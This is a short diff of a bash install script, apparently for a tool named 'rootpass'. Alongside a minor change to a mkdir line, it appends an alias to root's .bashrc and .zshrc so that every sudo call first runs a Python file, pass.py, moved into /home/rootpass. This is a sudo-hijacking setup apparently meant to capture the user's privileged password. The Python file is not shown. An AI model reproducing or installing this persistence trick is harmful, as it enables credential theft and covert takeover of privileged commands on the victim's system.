@@ -1,7 +1,7 @@
 #!/bin/bash
 apt install ruby python3 -y
 cd /home
-mkdir rootpass
+sudo mkdir rootpass
 sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.bashrc
 sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.zshrc
 sudo mv ~/termuxloginpass/pass.py /home/rootpass
